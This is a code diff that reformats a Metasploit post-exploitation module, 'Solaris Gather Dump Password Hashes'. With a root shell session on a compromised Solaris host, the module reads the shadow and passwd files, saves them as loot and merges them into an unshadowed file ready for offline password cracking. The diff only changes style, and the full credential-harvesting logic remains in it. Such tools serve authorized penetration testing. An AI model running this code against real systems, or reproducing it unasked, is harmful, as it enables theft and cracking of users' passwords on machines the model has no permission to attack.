@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,20 +8,17 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Solaris::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Solaris Gather Dump Password Hashes for Solaris Systems',
-        'Description'   => %q{ Post Module to dump the password hashes for all users on a Solaris System},
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-        'Platform'      => [ 'solaris' ],
-        'SessionTypes'  => [ 'shell' ]
-      ))
-
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Solaris Gather Dump Password Hashes for Solaris Systems',
+                      'Description'   => %q( Post Module to dump the password hashes for all users on a Solaris System),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+                      'Platform'      => [ 'solaris' ],
+                      'SessionTypes'  => [ 'shell' ]))
   end
 
   # Run Method for when run command is issued
@@ -32,8 +30,8 @@ class MetasploitModule < Msf::Post
       # Save in loot the passwd and shadow file
       p1 = store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
       p2 = store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
-      vprint_status("Shadow saved in: #{p1.to_s}")
-      vprint_status("passwd saved in: #{p2.to_s}")
+      vprint_status("Shadow saved in: #{p1}")
+      vprint_status("passwd saved in: #{p2}")
 
       # Unshadow the files
       john_file = unshadow(passwd_file, shadow_file)
@@ -47,22 +45,18 @@ class MetasploitModule < Msf::Post
     else
       print_error("You must run this module as root!")
     end
-
   end
 
-  def unshadow(pf,sf)
+  def unshadow(pf, sf)
     unshadowed = ""
     sf.each_line do |sl|
       pass = sl.scan(/^\w*:([^:]*)/).join
-      if pass !~ /^\*LK\*|^NP/
-        user = sl.scan(/(^\w*):/).join
-        pf.each_line do |pl|
-          if pl.match(/^#{user}:/)
-            unshadowed << pl.gsub(/:x:/,":#{pass}:")
-          end
-        end
+      next unless pass !~ /^\*LK\*|^NP/
+      user = sl.scan(/(^\w*):/).join
+      pf.each_line do |pl|
+        unshadowed << pl.gsub(/:x:/, ":#{pass}:") if pl =~ /^#{user}:/
       end
     end
-    return unshadowed
+    unshadowed
   end
 end
